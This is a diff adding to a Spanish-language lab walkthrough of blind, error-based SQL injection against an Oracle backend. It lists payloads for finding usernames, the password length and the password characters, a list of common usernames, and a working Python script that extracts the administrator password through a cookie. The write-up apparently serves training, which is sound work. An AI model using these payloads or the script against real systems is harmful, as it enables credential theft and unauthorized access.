@@ -146,3 +146,130 @@ Realizamos un ataque y analizar el estado de la respuesta, si es un estado 200 o
 Filtramos por las que tengan estado `200`
 
 ![Columna]({{site.url}}/images/SQLi/sqli-12/lista columnas.png)
+
+## Averiguar nombre de usuarios en la BD
+
+Ya que tenemos el nombre de la tabla y sus campos vamos a listar el nombre de los usuarios. TODO usuario que genere error existe en la tabla.
+
+```sql
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
+```
+
+Lista de nombre de usuarios mas comunes
+
+ ```
+admin
+administrator
+root
+user
+guest
+test
+superuser
+default
+manager
+support
+moderator
+developer
+operator
+owner
+sales
+marketing
+finance
+hr
+accounting
+itadmin
+ ```
+
+Realizamos el ataque de intruder
+
+![Intruder 2]({{site.url}}/images/SQLi/sqli-12/Intruder2.png)
+
+Si el usuario nos arroja error, en esta ocación existe dentro de la tabla `users`
+
+![Usuario]({{site.url}}/images/SQLi/sqli-12/usuario existe.png)
+
+## Averiguar longitud de password de un usuario
+
+El payload es tipo entero, ya que vamos a averiguar cuantos caracteres tiene el password de un usuario. 
+
+```sql
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>PAYLOAD) || ' 
+```
+![Intruder3]({{site.url}}/images/SQLi/sqli-11/Intruder3.png)
+
+El resultado correcto nos debe arrojar `ERROR` en este caso es `20` ya que es mayor a 19. La longitud del password es de `20`.
+
+![Resultado]({{site.url}}/images/SQLi/sqli-11/Resultado.png)
+
+## Ataque de Fuerza al campo Password
+
+Utiliza una consulta que verifique si un carácter en una posición específica coincide con una letra. Si arroja error la consulta la letra pertenece al password.
+
+```sql
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || '
+```
+
+Procedemos a realizar un `Intruder` en dos posiciones
+
+![Intruder]({{site.url}}/images/SQLi/sqli-11/Intruder4.png)
+
+Filtramos por estado error `500` esas son las letras que corresponden al password de `administrator`
+
+![Password]({{site.url}}/images/SQLi/sqli-11/password.png)
+
+## Login
+
+Probamos el passwor de la BD
+
+![Login]({{site.url}}/images/SQLi/sqli-11/login.png)
+
+## Aprobado ⭕
+
+![Aprobado]({{site.url}}/images/SQLi/sqli-11/aprobado.png)
+
+# Codigo Python 
+
+```python
+import sys
+import requests
+import urllib3
+import urllib.parse
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+
+def sqli_password(url):
+    password_extracted = ""
+    for i in range(1,21):
+        for j in range(32,126):
+            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies = {'TrackingId': 'FGDUewi6MoAn18KJ' + sqli_payload_encoded, 'session': 'VdmCjrlz6I6zAXGXEp2u32p0OXKDGhm2'}
+            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+            if r.status_code == 500:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
+            else:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
+
+def main():
+    if len(sys.argv) !=2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    url = sys.argv[1]
+    print("(+) Retreiving administrator password...")
+    sqli_password(url)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+
